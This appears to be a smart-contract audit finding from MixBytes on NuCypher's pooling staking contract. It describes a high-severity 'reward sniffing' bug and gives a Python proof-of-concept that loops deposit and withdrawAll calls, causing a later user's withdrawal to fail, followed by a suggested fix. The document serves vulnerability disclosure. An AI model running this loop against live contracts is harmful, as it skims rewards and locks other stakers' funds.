---
tags:
  - lang/solidity
  - platform/mixbytes
  - has/github
  - severity/high
  - sector/staking
protocol: "[[NuCypher]]"
auditors:
  - "[[MixBytes]]"
report: "https://github.com/mixbytes/audits_public/blob/master/NuCypher/README.md#1-reward-sniffing"
genome:
  - "[[frozen-funds]]"
  - "[[locked-funds]]"
  - "[[account-ownership]]"
  - "[[reward-accounting]]"
---
# Reward sniffing

- id: 28529
- impact: HIGH
- protocol: [[NuCypher]]
- reporter: MixBytes
- source: https://github.com/mixbytes/audits_public/blob/master/NuCypher/README.md#1-reward-sniffing

## Summary


A bug report has been issued regarding a user being able to deposit and withdraw tokens multiple times in the same transaction, which is causing reward sniffing. This behavior is demonstrated in the python code snippet provided. It is recommended that a check be added to the withdrawAll function to require deposit to be DISABLED. This will prevent the user from being able to deposit and withdraw tokens multiple times in the same transaction.

## Details

##### Description
User can deposit-withdraw tokens several times (at the same transaction), causing reward sniffing.
The emulation of this behavior is presented below:
```python
def main():
    deployer = accounts[0]
    workerOwner = accounts[1]
    
    escrow = deployer.deploy(StakingEscrowMock)
    escrow.setAllTokens(9000)

    token = deployer.deploy(EasyToken, 1000_000)
    stacking = deployer.deploy(PoolingStakingContractV2)
    workerFraction = 1
    stacking.initialize(workerFraction, token, escrow, workerOwner, {'from': deployer})
    stacking.enableDeposit({'from': deployer})

    user1 = accounts[2]
    user2 = accounts[3]
    deployer.transfer(stacking, 6000)
    token.mint(user1, 1000_000)
    token.mint(user2, 1000_000)

    token.approve(stacking, 100_000, {'from': user1})
    stacking.depositTokens(100_000, {'from': user1})
    
    for _ in range(100):
        token.approve(stacking, 100, {'from': user2})
        stacking.depositTokens(100, {'from': user2})
        stacking.withdrawAll({'from': user2})
    
    user1_balance = token.balanceOf(user1)
    user2_balance = token.balanceOf(user2)
    stacking_balance = token.balanceOf(stacking)

    print("user1_balance", user1_balance)
    print("user2_balance", user2_balance)
    print("stacking_balance", stacking_balance)

    stacking.withdrawAll({'from': user1})  # >>>> ERROR HERE <<<<
```
##### Recommendation
May be add a check in withdrawAll function to requre deposit DISABLED?
